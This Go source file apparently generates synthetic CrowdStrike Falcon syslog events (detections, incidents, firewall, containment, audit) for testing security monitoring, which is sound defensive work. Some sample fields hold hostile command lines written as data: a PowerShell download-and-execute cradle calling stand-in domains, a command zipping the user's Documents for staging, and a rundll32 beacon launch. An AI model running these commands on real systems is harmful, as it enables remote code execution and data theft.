				csKV("outcome", csDispBlocked[0]),
				csKV("CSMTRPatternDisposition", csDispBlocked[1]),
			}
			return crowdstrikePayload(c, core.SevCrit, csRecord(
				"Network Access In A Detection Summary Event",
				"Command and Control", "5", ext))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-dns-request", Source: core.SourceCrowdStrike,
			Group: "Detection detail", Name: "DNS request in a detection",
			Desc:    "The domain a detected process resolved, carried as its own syslog line with domainName and requestType.",
			EventID: "DetectionSummaryEvent", Channel: "DnsRequests",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1071.004"},
			Params:   []core.Param{pUser, param("host", "Endpoint", "auto"), param("domain", "Queried domain", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			sensorID := csSensorID(c)
			cid := csCID(c)
			domain := c.P("domain", c.Pick(
				"cdn-update-delivery.com", "api.telemetry-sync.net", "zxcv8a7sd6f.duckdns.org"))

			ext := []string{
				csKV("externalId", sensorID),
				csKV("cn2Label", "ProcessId"),
				csKV("cn2", csProcessID(c)),
				csKV("dhost", host),
				csKV("duser", user),
				csKV("fname", "powershell.exe"),
				csKV("filePath", `\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0`),
				csKV("dntdom", c.Env.NetBIOS),
				csKV("cs5Label", "CommandLine"),
				csKV("cs5", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('https://"+domain+"/a')"),
				csKV("cs6Label", "FalconHostLink"),
				csKV("cs6", csDetectionLink(c, sensorID, cid)),
				csKV("cn3Label", "Offset"),
				csKV("cn3", csOffset(c)),
				csKV("deviceCustomDate1Label", "DNS Request Time"),
				csKV("deviceCustomDate1", csDeviceDate(c)),
				csKV("rt", csEventTime(c)),
				csKV("src", c.InternalIP()),
				csKV("smac", csMAC(c)),
				csKV("cat", "Command and Control"),
				csKV("act", "Application Layer Protocol"),
				csKV("reason", "Keep Access"),
				csKV("outcome", csDispDetect[0]),
				csKV("CSMTRPatternDisposition", csDispDetect[1]),
				csKV("domainName", domain),
				csKV("causedDetect", "true"),
				csKV("requestType", "A"),
			}
			return crowdstrikePayload(c, core.SevWarning, csRecord(
				"DNS Request In A Detection Summary Event",
				"Command and Control", "4", ext))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-executable-written", Source: core.SourceCrowdStrike,
			Group: "Detection detail", Name: "Executable written in a detection",
			Desc:    "The binary a detected process dropped, with cs2 the file name and cs3 the path it was written to.",
			EventID: "DetectionSummaryEvent", Channel: "ExecutablesWritten",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1105"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			sensorID := csSensorID(c)
			cid := csCID(c)
			dropped := c.Pick("svchost32.exe", "wsus.exe", "mssecsvc.exe")

			ext := []string{
				csKV("externalId", sensorID),
				csKV("cn2Label", "ProcessId"),
				csKV("cn2", csProcessID(c)),
				csKV("dhost", host),
				csKV("duser", user),
				csKV("fname", "winword.exe"),
				csKV("filePath", `\Device\HarddiskVolume2\Program Files\Microsoft Office\root\Office16`),
				csKV("dntdom", c.Env.NetBIOS),
				csKV("cs2Label", "WrittenExeFileName"),
				csKV("cs2", dropped),
				csKV("cs3Label", "WrittenExeFilePath"),
				csKV("cs3", `\Device\HarddiskVolume2\Users\`+user+`\AppData\Local\Temp`),
				csKV("cs5Label", "CommandLine"),
				csKV("cs5", `"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n`),
				csKV("cs6Label", "FalconHostLink"),
				csKV("cs6", csDetectionLink(c, sensorID, cid)),
				csKV("cn3Label", "Offset"),
				csKV("cn3", csOffset(c)),
				csKV("deviceCustomDate1Label", "ExeWrittenTimestamp"),
				csKV("deviceCustomDate1", csDeviceDate(c)),
				csKV("rt", csEventTime(c)),
				csKV("src", c.InternalIP()),
				csKV("smac", csMAC(c)),
				csKV("cat", "Machine Learning"),
				csKV("act", "Malicious File"),
				csKV("reason", "Falcon Detection Method"),
				csKV("outcome", csDispQuarantined[0]),
				csKV("CSMTRPatternDisposition", csDispQuarantined[1]),
			}
			return crowdstrikePayload(c, core.SevWarning, csRecord(
				"Executable Written In A Detection Summary Event",
				"Machine Learning", "4", ext))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-quarantine-file", Source: core.SourceCrowdStrike,
			Group: "Detection detail", Name: "File quarantined in a detection",
			Desc:    "The quarantine action itself: cs2 carries the quarantined file's SHA256 and cs3 its original path.",
			EventID: "DetectionSummaryEvent", Channel: "QuarantineFiles",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1204.002"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			sensorID := csSensorID(c)
			cid := csCID(c)
			bad := c.Pick("invoice.exe", "update_x64.dll", "setup.msi")

			ext := []string{
				csKV("externalId", sensorID),
				csKV("cn2Label", "ProcessId"),
				csKV("cn2", csProcessID(c)),
				csKV("dhost", host),
				csKV("duser", user),
				csKV("fname", bad),
				csKV("filePath", `\Device\HarddiskVolume2\Users\`+user+`\Downloads`),
				csKV("dntdom", c.Env.NetBIOS),
				csKV("cs2Label", "QuarantineFileSHA256"),
				csKV("cs2", c.HexLower(64)),
				csKV("cs3Label", "QuarantineFilePath"),
				csKV("cs3", `\Device\HarddiskVolume2\Users\`+user+`\Downloads\`+bad),
				csKV("cs5Label", "CommandLine"),
				csKV("cs5", `C:\Users\`+user+`\Downloads\`+bad),
				csKV("cs6Label", "FalconHostLink"),
				csKV("cs6", csDetectionLink(c, sensorID, cid)),
				csKV("cn3Label", "Offset"),
				csKV("cn3", csOffset(c)),
				csKV("deviceCustomDate1Label", "ExeWrittenTimestamp"),
				csKV("deviceCustomDate1", csDeviceDate(c)),
				csKV("rt", csEventTime(c)),
				csKV("src", c.InternalIP()),
				csKV("smac", csMAC(c)),
				csKV("cat", "Malware"),
				csKV("act", "Malicious File"),
				csKV("reason", "Falcon Detection Method"),
				csKV("outcome", csDispQuarantined[0]),
				csKV("CSMTRPatternDisposition", csDispQuarantined[1]),
			}
			return crowdstrikePayload(c, core.SevWarning, csRecord(
				"Quarantined Files In A Detection Summary Event",
				"Malware", "4", ext))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-scan-result", Source: core.SourceCrowdStrike,
			Group: "Detection detail", Name: "AV scan result in a detection",
			Desc:    "The anti-malware verdict attached to a detection: cs1 the result name, cs2 the engine, cs4 the signature version.",
			EventID: "DetectionSummaryEvent", Channel: "ScanResults",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1204.002"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			sensorID := csSensorID(c)
			cid := csCID(c)
			bad := c.Pick("mimikatz.exe", "lazagne.exe", "psexec.exe")

			ext := []string{
				csKV("externalId", sensorID),
				csKV("cn2Label", "ProcessId"),
				csKV("cn2", csProcessID(c)),
				csKV("dhost", host),
				csKV("duser", user),
				csKV("fname", bad),
				csKV("filePath", `\Device\HarddiskVolume2\Users\Public`),
				csKV("fileHash", c.HexLower(32)),
				csKV("dntdom", c.Env.NetBIOS),
				csKV("cs2Label", "ScanResultEngine"),
				csKV("cs2", "CrowdStrike Anti-malware"),
				csKV("cs1Label", "ScanResultName"),
				csKV("cs1", c.Pick("HackTool/Win64.Mimikatz", "HackTool/Win32.LaZagne", "RiskTool/Win32.PsExec")),
				csKV("cs4Label", "ScanResultVersion"),
				csKV("cs4", fmt.Sprintf("%d.%d", c.Int(1, 9), c.Int(100, 999))),
				csKV("cs5Label", "CommandLine"),
				csKV("cs5", `C:\Users\Public\`+bad),
				csKV("cs6Label", "FalconHostLink"),
				csKV("cs6", csDetectionLink(c, sensorID, cid)),
				csKV("cn3Label", "Offset"),
				csKV("cn3", csOffset(c)),
				csKV("rt", csEventTime(c)),
				csKV("src", c.InternalIP()),
				csKV("smac", csMAC(c)),
				csKV("cat", "Malware"),
				csKV("act", "Malicious File"),
				csKV("reason", "Falcon Detection Method"),
				csKV("outcome", csDispQuarantined[0]),
				csKV("CSMTRPatternDisposition", csDispQuarantined[1]),
			}
			return crowdstrikePayload(c, core.SevWarning, csRecord(
				"AV Scan Results In A Detection Summary Event",
				"Malware", "4", ext))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-detect-document-access", Source: core.SourceCrowdStrike,
			Group: "Detection detail", Name: "Document accessed in a detection",
			Desc:    "A document a detected process opened. Useful for collection and staging hunts.",
			EventID: "DetectionSummaryEvent", Channel: "DocumentsAccessed",
			Severity: core.SevLabelMedium,
			Mitre:    []string{"T1005"},
			Params:   csDetectParams,
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			sensorID := csSensorID(c)
			cid := csCID(c)
			doc := c.Pick("payroll_2025.xlsx", "board_minutes.docx", "customers.csv")

			ext := []string{
				csKV("externalId", sensorID),
				csKV("cn2Label", "ProcessId"),
				csKV("cn2", csProcessID(c)),
				csKV("dhost", host),
				csKV("duser", user),
				csKV("fname", "powershell.exe"),
				csKV("filePath", `\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0`),
				csKV("dntdom", c.Env.NetBIOS),
				csKV("cs2Label", "AccessedDocFileName"),
				csKV("cs2", doc),
				csKV("cs3Label", "AccessedDocFilePath"),
				csKV("cs3", `\Device\HarddiskVolume2\Users\`+user+`\Documents`),
				csKV("cs5Label", "CommandLine"),
				csKV("cs5", `powershell.exe -c Compress-Archive -Path $env:USERPROFILE\Documents\* -DestinationPath C:\Users\Public\x.zip`),
				csKV("cs6Label", "FalconHostLink"),
				csKV("cs6", csDetectionLink(c, sensorID, cid)),
				csKV("cn3Label", "Offset"),
				csKV("cn3", csOffset(c)),
				csKV("deviceCustomDate1Label", "Document Accessed Timestamp"),
				csKV("deviceCustomDate1", csDeviceDate(c)),
				csKV("rt", csEventTime(c)),
				csKV("src", c.InternalIP()),
				csKV("smac", csMAC(c)),
				csKV("cat", "Collection"),
				csKV("act", "Data from Local System"),
				csKV("reason", "Follow Through"),
				csKV("outcome", csDispDetect[0]),
				csKV("CSMTRPatternDisposition", csDispDetect[1]),
			}
			return crowdstrikePayload(c, core.SevNotice, csRecord(
				"Document Access In A Detection Summary Event",
				"Collection", "3", ext))
		},
	})
}

// ---------------------------------------------------------------------------
// Incidents and firewall
// ---------------------------------------------------------------------------

func registerCrowdStrikeIncidents() {
	// csIncident builds an IncidentSummaryEvent. state and lateral vary; the
	// rest of the shape does not.
	csIncident := func(c *core.Ctx, state string, lateral int, score string, sysSev int) core.Payload {
		hostID := csSensorID(c)
		cid := csCID(c)
		incID := fmt.Sprintf("inc:%s:%s", hostID, c.HexLower(32))
		ext := []string{
			csKV("cat", "IncidentSummaryEvent"),
			csKV("cs1Label", "FalconHostLink"),
			csKV("cs1", "https://falcon.crowdstrike.com/crowdscore/incidents/details/"+incID+"?_cid="+cid),
			csKV("cs2Label", "State"),
			csKV("cs2", state),
			csKV("cn3Label", "FineScore"),
			csKV("cn3", score),
			csKV("deviceCustomDate1Label", "IncidentStartTime"),
			// deviceCustomDate1 is the connector's only time_field, so it is
			// formatted; deviceCustomDate2 below is left as raw epoch seconds.
			csKV("deviceCustomDate1", csDeviceDate(c)),
			csKV("deviceCustomDate2Label", "IncidentEndTime"),
			csKV("deviceCustomDate2", fmt.Sprint(c.Now.Unix())),
			csKV("incidentId", incID),
			csKV("externalId", hostID),
			csKV("incidentType", "1"),
			csKV("lateralMovement", fmt.Sprint(lateral)),
		}
		return crowdstrikePayload(c, sysSev, csRecord(
			"IncidentSummaryEvent", "IncidentSummaryEvent", "5", ext))
	}

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-incident-opened", Source: core.SourceCrowdStrike,
			Group: "Incidents", Name: "Incident opened",
			Desc:    "CrowdScore correlated several detections into an incident. This is the record a SOC opens a case against.",
			EventID: "IncidentSummaryEvent", Channel: "IncidentSummaryEvent",
			Severity: core.SevLabelCritical,
			Params:   []core.Param{param("score", "Fine score", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			score := c.P("score", fmt.Sprintf("%d.%d", c.Int(0, 9), c.Int(0, 9)))
			return csIncident(c, "open", 0, score, core.SevCrit)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-incident-lateral-movement", Source: core.SourceCrowdStrike,
			Group: "Incidents", Name: "Incident with lateral movement",
			Desc:    "An incident where lateralMovement is non-zero, meaning the activity has spread beyond the first host.",
			EventID: "IncidentSummaryEvent", Channel: "IncidentSummaryEvent",
			Severity: core.SevLabelCritical,
			Mitre:    []string{"T1021"},
			Params:   []core.Param{param("score", "Fine score", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			score := c.P("score", fmt.Sprintf("%d.%d", c.Int(5, 9), c.Int(0, 9)))
			return csIncident(c, "open", c.Int(1, 6), score, core.SevCrit)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-firewall-block", Source: core.SourceCrowdStrike,
			Group: "Firewall", Name: "Falcon firewall rule match",
			Desc:    "The host firewall Falcon manages blocked an outbound connection. FirewallMatchEvent uses its own non-standard extension keys rather than CEF's.",
			EventID: "FirewallMatchEvent", Channel: "FirewallMatchEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1071.001"},
			Params:   []core.Param{param("host", "Endpoint", "auto"), pDstIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			remote := c.P("dstip", c.ExternalIP())
			ext := []string{
				csKV("cat", "FirewallMatchEvent"),
				csKV("deviceId", csSensorID(c)),
				csKV("ipVLabel", "IpV"),
				csKV("ipV", "IPv4"),
				csKV("cmdLineLabel", "Command Line"),
				csKV("cmdLine", `rundll32.exe C:\Users\Public\beacon.dll,StartW`),
				csKV("connectionDirectionLabel", "Connection Direction"),
				// 0 outbound, 1 inbound.
				csKV("connectionDirection", "0"),
				csKV("eventType", "FirewallMatchEvent"),
				csKV("flags", "0"),
				csKV("hostName", host),
				csKV("icmpCodeLabel", "ICMP Code"),
				csKV("icmpCode", "0"),
				csKV("icmpTypeLabel", "ICMP Type"),
				csKV("icmpType", "0"),
				csKV("imageFileNameLabel", "Image File Name"),
				csKV("imageFileName", `\Device\HarddiskVolume2\Windows\System32\rundll32.exe`),
				csKV("localAddressLabel", "Local Address"),
				csKV("localAddress", c.InternalIP()),
				csKV("localPortLabel", "Local Port"),
				csKV("localPort", fmt.Sprint(c.EphemeralPort())),
				csKV("matchCountLabel", "Match Count"),
				csKV("matchCount", fmt.Sprint(c.Int(1, 40))),
				csKV("matchCountSinceLastReportLabel", "Match Count Since Last Report"),
				csKV("matchCountSinceLastReport", fmt.Sprint(c.Int(1, 10))),
				csKV("networkProfileLabel", "Network Profile"),
				csKV("networkProfile", "Domain"),
				csKV("PolicyNameLabel", "Policy Name"),
				csKV("policyName", "Corporate Workstations"),
				csKV("protocolLabel", "Protocol"),
				csKV("protocol", "6"),
				csKV("remoteAddressLabel", "Remote Address"),
				csKV("remoteAddress", remote),
				csKV("remotePortLabel", "Remote Port"),
				csKV("remotePort", "443"),
				csKV("ruleActionLabel", "Rule Action"),
				csKV("ruleAction", "Block"),
				csKV("ruleDescriptionLabel", "Rule Description"),
				csKV("ruleDescription", "Block outbound traffic to untrusted destinations"),
				csKV("ruleGroupNameLabel", "Rule Group Name"),
				csKV("ruleGroupName", "Egress Control"),
				csKV("ruleNameLabel", "Rule Name"),
				csKV("ruleName", "Deny outbound 443 to non-approved"),
				csKV("statusLabel", "Status"),
				csKV("status", "0"),
				csKV("cn3Label", "Offset"),
				csKV("cn3", csOffset(c)),
				csKV("rt", csEventTime(c)),
			}
			return crowdstrikePayload(c, core.SevWarning, csRecord(
				"FirewallMatchEvent", "Firewall Match event", "1", ext))
		},
	})
}

// ---------------------------------------------------------------------------
// Response: containment and Real Time Response sessions
// ---------------------------------------------------------------------------

func registerCrowdStrikeResponse() {
	// csUserAudit renders a UserActivityAuditEvent. operation lands in header
	// field 6, service in deviceProcessName.
	csUserAudit := func(c *core.Ctx, operation, service, actor, ip, success string, sysSev int) core.Payload {
		ext := []string{
			csKV("cat", "UserActivityAuditEvent"),
			csKV("destinationTranslatedAddress", ip),
			csKV("duser", actor),
			csKV("deviceProcessName", service),
			csKV("cn3Label", "Offset"),
			csKV("cn3", csOffset(c)),
			csKV("outcome", success),
			csKV("rt", csEventTime(c)),
		}
		return crowdstrikePayload(c, sysSev, csRecord(
			"UserActivityAuditEvent", operation, "1", ext))
	}

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-response-contain-host", Source: core.SourceCrowdStrike,
			Group: "Response", Name: "Host network containment requested",
			Desc:    "An endpoint was cut off from the network, leaving only the Falcon cloud reachable. The containment record and its later lift are the pair a SOC audits.",
			EventID: "UserActivityAuditEvent", Channel: "UserActivityAuditEvent",
			Severity: core.SevLabelHigh,
			Params:   []core.Param{pActor, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			actor := c.P("actor", c.UPN(c.AdminUser()))
			return csUserAudit(c, "containment_requested", "hosts",
				actor, c.P("srcip", c.ExternalIP()), "true", core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-response-lift-containment", Source: core.SourceCrowdStrike,
			Group: "Response", Name: "Host containment lifted",
			Desc:    "Containment was released. If this arrives without a corresponding incident closure, question it.",
			EventID: "UserActivityAuditEvent", Channel: "UserActivityAuditEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1562"},
			Params:   []core.Param{pActor, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			actor := c.P("actor", c.UPN(c.AdminUser()))
			return csUserAudit(c, "lift_containment_requested", "hosts",
				actor, c.P("srcip", c.ExternalIP()), "true", core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-rtr-session-start", Source: core.SourceCrowdStrike,
			Group: "Response", Name: "Real Time Response session opened",
			Desc:    "An analyst opened a remote shell on an endpoint. Legitimate in an investigation, and exactly what an attacker with console access would also do.",
			EventID: "RemoteResponseSessionStartEvent", Channel: "RemoteResponseSessionStartEvent",
			Severity: core.SevLabelMedium,
			Mitre:    []string{"T1219"},
			Params:   []core.Param{pActor, param("host", "Endpoint", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			actor := c.P("actor", c.UPN(c.AdminUser()))
			ext := []string{
				csKV("cat", "RemoteResponseSessionStartEvent"),
				csKV("cn3Label", "Offset"),
				csKV("cn3", csOffset(c)),
				csKV("rt", csEventTime(c)),
				csKV("dhost", host),
				csKV("duser", actor),
				csKV("sessionStartTimestampLabel", "RemoteResponseSessionStartTimestamp"),
				csKV("sessionStartTimestamp", fmt.Sprint(c.Now.Unix())),
				csKV("agentIdStringLabel", "AgentIdString"),
				csKV("agentIdString", csSensorID(c)),
			}
			return crowdstrikePayload(c, core.SevNotice, csRecord(
				"RemoteResponseSessionStartEvent", "Remote Response Session Start event", "1", ext))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-rtr-session-end", Source: core.SourceCrowdStrike,
			Group: "Response", Name: "Real Time Response commands run",
			Desc:    "The session close record, which carries the commands the analyst ran in cmd. This is the audit trail for remote shell activity.",
			EventID: "RemoteResponseSessionEndEvent", Channel: "RemoteResponseSessionEndEvent",
			Severity: core.SevLabelMedium,
			Mitre:    []string{"T1219"},
			Params:   []core.Param{pActor, param("host", "Endpoint", "auto"), param("command", "Command run", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			actor := c.P("actor", c.UPN(c.AdminUser()))
			cmd := c.P("command", c.Pick(
				"get C:\\Users\\Public\\beacon.dll",
				"runscript -CloudFile=CollectTriage",
				"put psexec.exe",
				"reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\CSAgent",
			))
			ext := []string{
				csKV("cat", "RemoteResponseSessionEndEvent"),
				csKV("cn3Label", "Offset"),
				csKV("cn3", csOffset(c)),
				csKV("rt", csEventTime(c)),
				csKV("dhost", host),
				csKV("duser", actor),
				csKV("sessionEndTimestampLabel", "RemoteResponseSessionEndTimestamp"),
				csKV("sessionEndTimestamp", fmt.Sprint(c.Now.Unix())),
				csKV("cmdLabel", "Command"),
				csKV("cmd", cmd),
			}
			return crowdstrikePayload(c, core.SevNotice, csRecord(
				"RemoteResponseSessionEndEvent", "Remote Response Session End event", "1", ext))
		},
	})
}

// ---------------------------------------------------------------------------
// Audit: console authentication and console administration
// ---------------------------------------------------------------------------

func registerCrowdStrikeAudit() {
	// csAuthAudit renders an AuthActivityAuditEvent. Note the header: both the
	// signature id and the name are the OperationName, and the severity is the
	// literal 1 for every one of these.
	csAuthAudit := func(c *core.Ctx, operation, service, actor, ip, success string, sysSev int) core.Payload {
		ext := []string{
			csKV("cat", "AuthActivityAuditEvent"),
			csKV("destinationTranslatedAddress", ip),
			csKV("duser", actor),
			csKV("deviceProcessName", service),
			csKV("cn3Label", "Offset"),
			csKV("cn3", csOffset(c)),
			csKV("outcome", success),
			csKV("deviceCustomDate1Label", "Timestamp"),
			csKV("deviceCustomDate1", csDeviceDate(c)),
			csKV("rt", csEventTime(c)),
		}
		return crowdstrikePayload(c, sysSev, csRecord(operation, operation, "1", ext))
	}

	csUserAudit := func(c *core.Ctx, operation, service, actor, ip, success string, sysSev int) core.Payload {
		ext := []string{
			csKV("cat", "UserActivityAuditEvent"),
			csKV("destinationTranslatedAddress", ip),
			csKV("duser", actor),
			csKV("deviceProcessName", service),
			csKV("cn3Label", "Offset"),
			csKV("cn3", csOffset(c)),
			csKV("outcome", success),
			csKV("rt", csEventTime(c)),
		}
		return crowdstrikePayload(c, sysSev, csRecord(
			"UserActivityAuditEvent", operation, "1", ext))
	}

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-audit-console-login", Source: core.SourceCrowdStrike,
			Group: "Audit", Name: "Console login succeeded",
			Desc:    "A Falcon console sign-in. The console is a full remote-execution platform, so its logins deserve the same scrutiny as a domain admin logon.",
			EventID: "AuthActivityAuditEvent", Channel: "AuthActivityAuditEvent",
			Severity: core.SevLabelMedium,
			Mitre:    []string{"T1078"},
			Params:   []core.Param{pActor, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return csAuthAudit(c, "userAuthenticate", "CrowdStrike Authentication",
				c.P("actor", c.UPN(c.User())), c.P("srcip", c.ExternalIP()),
				"true", core.SevNotice)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-audit-console-login-failed", Source: core.SourceCrowdStrike,
			Group: "Audit", Name: "Console login failed",
			Desc:    "A failed console sign-in. Repeated failures against the EDR console are a credential-stuffing signal worth its own rule.",
			EventID: "AuthActivityAuditEvent", Channel: "AuthActivityAuditEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1110"},
			Params:   []core.Param{pActor, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return csAuthAudit(c, "userAuthenticate", "CrowdStrike Authentication",
				c.P("actor", c.UPN(c.User())), c.P("srcip", c.ExternalIP()),
				"false", core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-audit-two-factor", Source: core.SourceCrowdStrike,
			Group: "Audit", Name: "Two-factor challenge",
			Desc:    "The second factor step of a console sign-in, emitted separately from userAuthenticate.",
			EventID: "AuthActivityAuditEvent", Channel: "AuthActivityAuditEvent",
			Severity: core.SevLabelMedium,
			Mitre:    []string{"T1621"},
			Params:   []core.Param{pActor, pSrcIP, param("outcome", "Outcome (true/false)", "true")},
		},
		Build: func(c *core.Ctx) core.Payload {
			ok := c.P("outcome", "true")
			sev := core.SevNotice
			if ok == "false" {
				sev = core.SevWarning
			}
			return csAuthAudit(c, "twoFactorAuthenticate", "CrowdStrike Authentication",
				c.P("actor", c.UPN(c.User())), c.P("srcip", c.ExternalIP()), ok, sev)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-audit-api-stream-started", Source: core.SourceCrowdStrike,
			Group: "Audit", Name: "API key opened the event stream",
			Desc:    "An API client started consuming the Streaming API. A second, unexpected consumer means somebody else has a key.",
			EventID: "AuthActivityAuditEvent", Channel: "AuthActivityAuditEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1078.004"},
			Params:   []core.Param{param("client", "API client id", "auto"), pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			client := c.P("client", "api-client-id:"+c.HexLower(32))
			return csAuthAudit(c, "streamStarted", "Crowdstrike Streaming API",
				client, c.P("srcip", c.ExternalIP()), "true", core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-audit-entitlement-check", Source: core.SourceCrowdStrike,
			Group: "Audit", Name: "Entitlement validation failed",
			Desc:    "validateEntitlementsHmac with outcome=false. High volume in normal operation, which is why it is worth knowing before writing a rule against it.",
			EventID: "AuthActivityAuditEvent", Channel: "AuthActivityAuditEvent",
			Severity: core.SevLabelInfo,
			Params:   []core.Param{pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return csAuthAudit(c, "validateEntitlementsHmac", "CrowdStrike Authentication",
				"Customer", c.P("srcip", c.InternalIP()), "false", core.SevInfo)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-audit-user-created", Source: core.SourceCrowdStrike,
			Group: "Audit", Name: "Console user created",
			Desc:    "A new Falcon console account. Persistence in the security tooling itself.",
			EventID: "UserActivityAuditEvent", Channel: "UserActivityAuditEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1136.003"},
			Params:   []core.Param{pActor, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return csUserAudit(c, "createUser", "users",
				c.P("actor", c.UPN(c.AdminUser())), c.P("srcip", c.ExternalIP()),
				"true", core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-audit-roles-granted", Source: core.SourceCrowdStrike,
			Group: "Audit", Name: "Console roles granted",
			Desc:    "Roles were added to a console account. Granting Falcon Administrator is equivalent to domain admin over every endpoint.",
			EventID: "UserActivityAuditEvent", Channel: "UserActivityAuditEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1098"},
			Params:   []core.Param{pActor, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return csUserAudit(c, "grantUserRoles", "users",
				c.P("actor", c.UPN(c.AdminUser())), c.P("srcip", c.ExternalIP()),
				"true", core.SevWarning)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-audit-detection-update", Source: core.SourceCrowdStrike,
			Group: "Audit", Name: "Detection status changed",
			Desc:    "A detection was reassigned, commented on, or closed. Mass closing of detections is how an insider buries an intrusion.",
			EventID: "UserActivityAuditEvent", Channel: "UserActivityAuditEvent",
			Severity: core.SevLabelMedium,
			Mitre:    []string{"T1562"},
			Params:   []core.Param{pActor, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return csUserAudit(c, "detection_update", "detections",
				c.P("actor", c.UPN(c.AdminUser())), c.P("srcip", c.ExternalIP()),
				"true", core.SevNotice)
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "crowdstrike-audit-policy-update", Source: core.SourceCrowdStrike,
			Group: "Audit", Name: "Prevention policy changed",
			Desc:    "A prevention policy was edited. Weakening a policy is the console-side equivalent of disabling the sensor. Note: this operation name is inferred, see the file comment.",
			EventID: "UserActivityAuditEvent", Channel: "UserActivityAuditEvent",
			Severity: core.SevLabelHigh,
			Mitre:    []string{"T1562.001"},
			Params:   []core.Param{pActor, pSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return csUserAudit(c, "update_policy", "prevention_policies",
				c.P("actor", c.UPN(c.AdminUser())), c.P("srcip", c.ExternalIP()),
				"true", core.SevWarning)
		},
	})

}
